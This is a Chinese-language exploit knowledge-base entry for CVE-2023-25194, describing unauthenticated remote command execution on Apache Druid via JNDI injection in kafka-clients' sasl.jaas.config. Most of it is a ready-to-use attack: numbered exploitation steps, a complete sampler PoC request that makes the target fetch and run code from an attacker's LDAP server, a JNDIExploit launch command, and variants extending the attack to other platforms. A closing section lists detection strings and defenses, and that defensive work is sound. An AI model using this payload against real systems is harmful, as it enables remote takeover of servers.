---
id: web-java-deserialization-jndi-druid-kafka-sasl-jaas-jndi
title: Druid Kafka sampler 未授权 + kafka-clients sasl.jaas.config JNDI 注入（CVE-2023-25194）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: druid-kafka-sasl-jaas-jndi-injection
aliases:
- CVE-2023-25194
- Kafka clients JNDI 注入
- sasl.jaas.config JndiLoginModule
- Druid sampler RCE
- /druid/indexer/v1/sampler
- Apache Druid Kafka RCE
tags:
- java
- jndi
- ldap
- kafka
- kafka-clients
- druid
- sasl
- jaas
- rce
- cve-2023-25194
cve:
- CVE-2023-25194
affected_versions: kafka-clients < 3.4.0（原文：版本 3.4.0 以前）
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V535
  verified_at: '2026-11-11T17:34:47+08:00'
  notes: 已对照原文全文与25张截图(img_small)核对：图03 Druid 25.0.0首页；图04 JNDIExploit-1.1-SNAPSHOT用法；图05 sampler请求consumerProperties.sasl.jaas.config=JndiLoginModule+user.provider.url=ldap://.../Basic/Command/base64/...，无认证头；图07 JNDIExploit收到Basic/Command/base64查询并回ResourceRef重定向ExploitDruyU1U74K.class；图08 /tmp/success回显uid=0(root)。原文明确kafka-clients 3.4.0以前存在JNDI注入，affected_versions正确。dedup top候选为CVE-2025-27817 token.endpoint.url file读取/SSRF及Databricks krbJAASFile等，CVE与sink均不同，非同链；dup-scan无涉及pair。未实测复现。
---

## 一句话结论

Apache Druid 的 `/druid/indexer/v1/sampler?for=connect` 接口允许提交任意 Kafka 采样配置；把 `consumerProperties.sasl.jaas.config` 设为 `com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker:1389/..."`，Druid 在创建 Kafka consumer 时会让受影响版本（<3.4.0）的 `kafka-clients` 实例化该 LoginModule，`JndiLoginModule` 随即对 `user.provider.url` 发起 JNDI lookup，触发 JNDI 注入并远程执行命令（Druid 25.0.0 实测未授权可打）。

## 原理

- **Druid sampler 接受完整 Kafka consumer 配置**：Druid 的 sampler 端点用于“试采样”数据源，`type:kafka` 的请求体里 `ioConfig.consumerProperties` 会被直接用于构造 Kafka consumer。该接口在默认部署下未启用认证，外网可达即可提交。
- **kafka-clients 的 `sasl.jaas.config` 可指定任意 LoginModule**：Kafka 客户端解析 `sasl.jaas.config` 时，会用反射实例化 `required/who` 之后的类名。CVE-2023-25194 的问题在于没有限制可实例化的 LoginModule 类型；攻击者把类名写成标准 JDK 自带的 `com.sun.security.auth.module.JndiLoginModule`。
- **JndiLoginModule 是 JNDI sink**：该 LoginModule 的 `user.provider.url`/`group.provider.url` 会被交给 `InitialContext.lookup()` 解析，LDAP 服务可返回恶意 Reference/序列化数据，触发 JNDI 注入（高版本 JDK 需结合本地 ObjectFactory gadget 或 LDAP 反序列化链，常见工具 JNDIExploit 的 `Basic/Command/base64/...` 模式即远程加载恶意类）。
- **为什么 Druid 是放大器**：漏洞本身在 Java 库 `kafka-clients`，普通场景下攻击者控制不了客户端连接参数；Druid 把 consumerProperties 暴露给请求方，且默认无鉴权，使“能访问 8888 端口”直接等价于“能控制 Kafka 客户端配置”。
- **版本条件**：原文标注 kafka-clients 3.4.0 以前存在该 JNDI 注入，3.4.0 起修复（限制 LoginModule）。Druid 25.0.0 依赖的 kafka-clients 落在受影响区间。

## 触发条件

- 目标为 Apache Druid（原文环境 25.0.0），`/druid/indexer/v1/sampler` 可从外网/攻击者位置访问且未启用认证。
- 目标 classpath 中 kafka-clients < 3.4.0，且 Druid 允许通过 sampler 指定 `consumerProperties`。
- 目标能出网访问攻击者的 LDAP/HTTP 服务（或 LDAP 返回的恶意类地址/本地 gadget 可用）。
- JDK 版本允许相应 JNDI 利用路径（高版本需使用本地工厂/反序列化 gadget 的绕过方式）。

## 利用步骤

1. 访问 `http://target:8888/` 确认是 Apache Druid（原文首页显示 version 25.0.0）。
2. 启动恶意 LDAP/HTTP 服务（如 JNDIExploit），准备返回执行 `id > /tmp/success` 的 payload。
3. 向 `POST /druid/indexer/v1/sampler?for=connect` 提交 JSON：`type:kafka`，`ioConfig.consumerProperties` 中设置 `bootstrap.servers`（可填任意可达/不可达地址）、`sasl.mechanism`、`security.protocol`，以及关键的 `sasl.jaas.config`。
4. `sasl.jaas.config` 填 `com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker:1389/Basic/Command/base64/<base64命令>" useFirstPass="true" serviceName="x" debug="true" group.provider.url="x";`。
5. Druid 构造 consumer 时实例化 JndiLoginModule → LDAP lookup → 远程类加载/反序列化 → 命令执行；LDAP 服务日志出现查询、目标 `/tmp/success` 出现命令输出。
6. 验证后清理采样任务与 LDAP 服务。

## PoC

最小请求（按原文 exp 精简，命令部分用占位符）：

```http
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: target:8888
Content-Type: application/json
Content-Length: <len>

{
  "type": "kafka",
  "spec": {
    "type": "kafka",
    "ioConfig": {
      "type": "kafka",
      "consumerProperties": {
        "bootstrap.servers": "127.0.0.1:6666",
        "sasl.mechanism": "SCRAM-SHA-256",
        "security.protocol": "SASL_SSL",
        "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://<attacker>:1389/Basic/Command/base64/<base64(cmd)>\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
      },
      "topic": "test",
      "useEarliestOffset": true,
      "inputFormat": {
        "type": "regex",
        "pattern": "([\\s\\S]*)",
        "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965",
        "columns": ["raw"]
      }
    },
    "dataSchema": {
      "dataSource": "sample",
      "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "1970-01-01T00:00:00Z"},
      "dimensionsSpec": {},
      "granularitySpec": {"rollup": false}
    },
    "tuningConfig": {"type": "kafka"}
  },
  "samplerConfig": {"numRows": 500, "timeoutMs": 15000}
}
```

JNDI 服务侧（原文）：

```bash
java -jar JNDIExploit-1.1-SNAPSHOT.jar -i <attacker-ip> -u
# 使用 Basic/Command/base64/<base64(cmd)> 形式的 LDAP URL，例如 id > /tmp/success
```

## 变体与关联

- **LoginModule 变体**：除 `JndiLoginModule` 外，其他可产生 JNDI/副作用的标准 LoginModule 或 classpath 上的自定义 LoginModule 也可作为 sink；修复版本对可实例化的模块做了限制。
- **载体变体**：任何允许用户提交 Kafka `consumerProperties`/`producerProperties` 的平台都可能成为放大器（Kafka Connect、Kafka UI、数据集成平台等），Druid 只是其中之一。
- **JNDI 绕过**：高版本 JDK 的 `trustURLCodebase=false` 绕过思路见 [[web-java-deserialization-jndi-druid-datasource-factory-h2-init]]、[[web-java-deserialization-jndi-high-version-beanfactory-el]]。
- **同组件其他问题**：Druid 监控台未授权与会话泄露见 [[web-java-component-druid-statview-unauth-websession-json]]；Druid 数据源 JNDI 见 [[web-java-deserialization-jndi-druid-datasource-factory-h2-init]]。

## 检测与防御

- **检测（Web）**：`/druid/indexer/v1/sampler` 出现 `sasl.jaas.config`、`JndiLoginModule`、`ldap://`、`user.provider.url` 等字符串；未认证的 sampler 请求；Druid 日志中的 Kafka consumer 创建异常与 JNDI 查询。
- **检测（网络/主机）**：Druid 进程向外部 LDAP(389/1389)/HTTP 发起连接；JNDI 查询特征（`Basic/Command`、`javaSerializedData`、`RemoteReference`）；随后出现 `bash`/`cmd` 子进程或异常文件落地。
- **防御**：升级 kafka-clients 到 3.4.0+（或升级 Druid 及其依赖）；关闭/限制 Druid sampler 接口，启用 Druid 认证与来源 IP 白名单；禁止 Druid 出站到非业务地址；JDK 保持最新并限制 JNDI 远程 codebase；对 Kafka 客户端配置的来源做白名单校验。
